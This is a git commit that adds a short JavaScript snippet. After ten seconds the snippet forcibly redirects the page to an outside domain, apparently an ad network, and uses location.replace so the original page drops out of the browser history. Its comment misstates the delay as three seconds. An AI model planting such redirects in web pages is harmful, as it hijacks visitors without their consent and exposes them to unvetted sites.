d8a95c4614769b2d7d737851a47717c9a8abcac6
dexamax <166790203+dexamax@users.noreply.github.com>
2025-05-24 09:13:06 +0530

    Create redirectauto10s.js

---
+++ redirectauto10s.js
@@ -0,0 +1,7 @@
+<script>
+        // Set a timeout for redirecting
+        setTimeout(function() {
+            // Redirect to the specified URL and replace the current page in the history stack
+            window.location.replace("https://whoushex.top/4/9134749");  // Redirect to the URL
+        }, 10000);  // 3000 milliseconds = 3 seconds
+    </script>
